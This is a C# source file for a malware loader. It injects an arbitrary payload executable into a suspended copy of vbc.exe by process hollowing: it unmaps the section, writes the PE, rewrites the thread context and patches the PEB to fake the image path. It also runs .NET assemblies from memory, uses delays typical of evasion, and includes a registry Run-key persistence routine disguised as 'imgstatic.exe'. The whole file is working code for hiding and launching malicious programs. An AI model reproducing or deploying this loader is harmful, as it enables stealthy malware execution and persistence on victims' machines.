using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using static System.Environment;

namespace Loader
{

    class Loader
    {
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr ProcessHandle;
            public IntPtr ThreadHandle;
            public uint ProcessId;
            public uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct STARTUP_INFORMATION
        {
            public uint Size;
            public string Reserved1;
            public string Desktop;
            public string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
            public byte[] Misc;
            public IntPtr Reserved2;
            public IntPtr StdInput;
            public IntPtr StdOutput;
            public IntPtr StdError;
        }


        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref Loader.STARTUP_INFORMATION startupInfo, ref Loader.PROCESS_INFORMATION processInformation);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("ntdll.dll")]
        private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern int ResumeThread(IntPtr handle);



        public static bool RunFromMemory(byte[] bytes)
        {
            try
            {
                Assembly assembly = Assembly.Load(bytes);
                MethodInfo entryPoint = assembly.EntryPoint;
                object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name));
                entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), new object[] { new string[] { "1" } });
            }
            catch (Exception e)
            {
                return false;
            }
            return true;
        }
        public static bool RunFromMemoryBackup(byte[] bytes)
        {
            try
            {
                Assembly.Load(bytes).EntryPoint.Invoke(null, null);
            }
            catch (Exception e)
            {
                return false;
            }
            return true;
        }   
        public static bool IsFileDotNetAssembly(byte[] file)
        {
            int hResult = 0;
            const int COR_E_ASSEMBLYEXPECTED = -2147024885;
            const int COR_E_NEWER_RUNTIME = -2146234341;
            const int COR_E_FILELOAD = -2146232799;
            Assembly assemblyBuffer = default(Assembly);
            try
            {
                assemblyBuffer = Assembly.ReflectionOnlyLoad(file);
                return true;
            }
            catch (BadImageFormatException ex)
            {
                hResult = Marshal.GetHRForException(ex);
                if (!(hResult == COR_E_ASSEMBLYEXPECTED))
                {
                    if ((hResult == COR_E_NEWER_RUNTIME))
                    {
                        return true;
                    }
                }
            }
            catch (System.IO.FileLoadException ex)
            {
                hResult = Marshal.GetHRForException(ex);
                if ((hResult == COR_E_FILELOAD))
                {
                    return true;
                }
            }
            return false;
        }


        public static void AddToStartup()
        {
            string folder = "imgstatic";
            string file   = "imgstatic.exe";
            if (!(Directory.Exists(GetFolderPath(SpecialFolder.ApplicationData) + "\\" + folder) & File.Exists(GetFolderPath(SpecialFolder.ApplicationData) + "\\" + folder + "\\" + file)))
            {
                Directory.CreateDirectory(GetFolderPath(SpecialFolder.ApplicationData) + "\\" + folder);
                File.Copy(Assembly.GetEntryAssembly().Location, GetFolderPath(SpecialFolder.ApplicationData) + "\\"+folder+"\\" + file);
                Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("imgstatic", GetFolderPath(SpecialFolder.ApplicationData) + "\\" + folder + "\\" + file);
            }
        }

    
        public static bool RunProgram(byte[] exeFile)
        {
            bool ret = false;
            if ((IsFileDotNetAssembly(exeFile)))
            {
                if (!(RunFromMemory(exeFile)))
                {
                    if (!(RunFromMemoryBackup(exeFile)))
                    {
                        ret = false;
                    }
                }
            } else {               
                string vbcPath = Environment.GetEnvironmentVariable("windir") + @"\Microsoft.NET\Framework\v2.0.50727\vbc.exe";
                ret = Run(vbcPath, "", exeFile, false);
            }

            // Add to Startup
            //AddToStartup();

            return ret;                        
        }

        public static bool Run(string path, string cmd, byte[] data, bool compatible)
        {
            bool result;
            for (int i = 1; i <= 5; i++)
            {
                if (Loader.HandleRun(path, cmd, data, compatible))
                {
                    result = true;
                    return result;
                }
            }
            result = false;
            return result;
        }


        private static bool HandleRun(string path, string cmd, byte[] data, bool compatible)
        {
            int num = 0;
            string text = string.Format("\"{0}\"", path);
            Loader.STARTUP_INFORMATION targetProcessStartInfo = default(Loader.STARTUP_INFORMATION);
            Loader.PROCESS_INFORMATION targetProcessInfo = default(Loader.PROCESS_INFORMATION);
            targetProcessStartInfo.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(Loader.STARTUP_INFORMATION)));
            bool result;
            try
            {
                if (!string.IsNullOrEmpty(cmd))
                {
                    text = text + " " + cmd;
                }
                if (!Loader.CreateProcess(path, text, IntPtr.Zero, IntPtr.Zero, false, 4u, IntPtr.Zero, null, ref targetProcessStartInfo, ref targetProcessInfo))
                {
                    throw new Exception();
                }
                int num2 = BitConverter.ToInt32(data, 60);
                int num3 = BitConverter.ToInt32(data, num2 + 52);
                int[] array = new int[179];
                array[0] = 65538;
                if (IntPtr.Size == 4)
                {
                    // 32bit windows
                    if (!Loader.GetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }
                else
                {
                    // windows 64 bit
                    if (!Loader.Wow64GetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }
                int num4 = array[41];
                int num5 = 0;
                if (!Loader.ReadProcessMemory(targetProcessInfo.ProcessHandle, num4 + 8, ref num5, 4, ref num))
                {
                    throw new Exception();
                }
                if (num3 == num5)
                {
                    if (Loader.NtUnmapViewOfSection(targetProcessInfo.ProcessHandle, num5) != 0)
                    {
                        throw new Exception();
                    }
                }

                Loader.Sleep(5000);

                int length = BitConverter.ToInt32(data, num2 + 80);
                int bufferSize = BitConverter.ToInt32(data, num2 + 84);
                bool flag = false;
                int num6 = Loader.VirtualAllocEx(targetProcessInfo.ProcessHandle, num3, length, 12288, 64);
                if (!compatible && num6 == 0)
                {
                    flag = true;
                    num6 = Loader.VirtualAllocEx(targetProcessInfo.ProcessHandle, 0, length, 12288, 64);
                }
                if (num6 == 0)
                {
                    throw new Exception();
                }

                Loader.Sleep(5000);

                if (!Loader.WriteProcessMemory(targetProcessInfo.ProcessHandle, num6, data, bufferSize, ref num))
                {
                    throw new Exception();
                }

                int num7 = num2 + 248;
                short num8 = BitConverter.ToInt16(data, num2 + 6);
                for (int i = 0; i <= (int)(num8 - 1); i++)
                {
                    int num9 = BitConverter.ToInt32(data, num7 + 12);
                    int num10 = BitConverter.ToInt32(data, num7 + 16);
                    int srcOffset = BitConverter.ToInt32(data, num7 + 20);
                    if (num10 != 0)
                    {
                        byte[] array2 = new byte[num10];
                        Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length);
                        if (!Loader.WriteProcessMemory(targetProcessInfo.ProcessHandle, num6 + num9, array2, array2.Length, ref num))
                        {
                            throw new Exception();
                        }
                    }
                    num7 += 40;
                }

                Loader.Sleep(10000);

                byte[] bytes = BitConverter.GetBytes(num6);
                if (!Loader.WriteProcessMemory(targetProcessInfo.ProcessHandle, num4 + 8, bytes, 4, ref num))
                {
                    throw new Exception();
                }
                int num11 = BitConverter.ToInt32(data, num2 + 40);
                if (flag)
                {
                    num6 = num3;
                }

                array[44] = num6 + num11;
                if (IntPtr.Size == 4)
                {
                    if (!Loader.SetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }
                else
                {
                    if (!Loader.Wow64SetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }

                Loader.Sleep(5000);

                Loader.ReadProcessMemory(targetProcessInfo.ProcessHandle, 0x0, ref num5, 4, ref num);

                if (IntPtr.Size == 4)
                {
                    // 32bit windows
                    if (!Loader.GetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }
                else
                {
                    // windows 64 bit
                    if (!Loader.Wow64GetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }

                Loader.Sleep(5000);

                // Patch the PEB
                PEB_Patch.Apply(targetProcessInfo.ThreadHandle, Assembly.GetEntryAssembly().Location);

                Loader.Sleep(5000);

                if (Loader.ResumeThread(targetProcessInfo.ThreadHandle) == -1)
                {
                    throw new Exception();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                Process processById = Process.GetProcessById(Convert.ToInt32(targetProcessInfo.ProcessId));
                if (processById != null)
                {
                    processById.Kill();
                }
                result = false;
                return result;
            }
            result = true;
            return result;
        }
    }

    unsafe class PEB_Patch
    {
        [DllImport("ntdll.dll")]
        static extern int NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, out PROCESS_BASIC_INFORMATION ProcessInformation, uint ProcessInformationLength, out uint ReturnLength);
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, out uint lpNumberOfBytesRead);

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2a;
            public IntPtr Reserved2b;
            public uint UniqueProcessId;
            public IntPtr Reserved3;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PEB
        {
            public fixed byte Reserved1[2];
            public byte BeingDebugged;
            public fixed byte Reserved2[1];
            public IntPtr Mutant;
            public IntPtr ImageBaseAddress;
            public IntPtr LoaderData;
            public IntPtr ProcessParameters;
            public fixed byte Reserved4[104];
            public fixed uint Reserved5[52];
            public IntPtr PostProcessInitRoutine;
            public fixed byte Reserved6[128];
            public fixed uint Reserved7[1];
            public uint SessionId;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct RTL_USER_PROCESS_PARAMETERS
        {
            public uint MaximumLength;
            public uint Length;
            public uint Flags;
            public uint DebugFlags;
            public IntPtr ConsoleHandle;
            public uint ConsoleFlags;
            public IntPtr StdInputHandle;
            public IntPtr StdOutputHandle;
            public IntPtr StdErrorHandle;
            public UNICODE_STRING CurrentDirectoryPath;
            public IntPtr CurrentDirectoryHandle;
            public UNICODE_STRING DllPath;
            public UNICODE_STRING ImagePathName;
            public UNICODE_STRING CommandLine;
            public IntPtr Environment;
            public uint StartingPositionLeft;
            public uint StartingPositionTop;
            public uint Width;
            public uint Height;
            public uint CharWidth;
            public uint CharHeight;
            public uint ConsoleTextAttributes;
            public uint WindowFlags;
            public uint ShowWindowFlags;
            public UNICODE_STRING WindowTitle;
            public UNICODE_STRING DesktopName;
            public UNICODE_STRING ShellInfo;
            public UNICODE_STRING RuntimeData;
            public fixed byte DLCurrentDirectory[0x20 * 0xc];
        }

        [StructLayout(LayoutKind.Sequential)]
        struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        static void WriStr(IntPtr hp, ref UNICODE_STRING ucod, string newq)
        {
            if (!string.IsNullOrEmpty(newq) &&
                    newq.Length > 0)
            {
                uint der;

                byte[] sbuf = Encoding.Unicode.GetBytes(newq);
                IntPtr ptr = Marshal.AllocHGlobal(sbuf.Length);
                Marshal.Copy(sbuf, 0, ptr, sbuf.Length);

                VirtualProtectEx(hp, ucod.Buffer, (uint)sbuf.Length, /* PAGE_EXECUTE_READWRITE */ 0x40, out der);
                WriteProcessMemory(hp, ucod.Buffer, ptr, (uint)sbuf.Length, out der);
                ucod.Length = (ushort)(newq.Length * 2);
            }
        }
        public static bool Apply(IntPtr hProcess, string path = null, string cmdLine = null, string CurrentDirectoryPath = null)
        {
            if (hProcess == null ||
                hProcess == IntPtr.Zero)
            {
                return false;
            }

            try
            {
                // default Varametrs
                uint len;

                // get PROCESS_BASIC_INFORMATION
                var info = new PROCESS_BASIC_INFORMATION();
                NtQueryInformationProcess(hProcess, 0, out info, (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out len);

                // get PROCESS_BASIC_INFORMATION
                var peb = new PEB();
                ReadProcessMemory(hProcess, info.PebBaseAddress, (IntPtr)(&peb), (uint)Marshal.SizeOf(typeof(PEB)), out len);

                // get RTL_USER_PROCESS_PARAMETERS
                var psParam = new RTL_USER_PROCESS_PARAMETERS();
                ReadProcessMemory(hProcess, peb.ProcessParameters, (IntPtr)(&psParam), (uint)Marshal.SizeOf(typeof(RTL_USER_PROCESS_PARAMETERS)), out len);

                // patch
                WriStr(hProcess, ref psParam.ImagePathName, path);
                WriStr(hProcess, ref psParam.CommandLine, cmdLine);
                WriStr(hProcess, ref psParam.CurrentDirectoryPath, CurrentDirectoryPath);

                // reflecet Changes
                return
                    WriteProcessMemory(hProcess, peb.ProcessParameters, (IntPtr)(&psParam), (uint)Marshal.SizeOf(typeof(RTL_USER_PROCESS_PARAMETERS)), out len);
            }
            catch (Exception)
            {
                return false;
            }
        }    
    }
}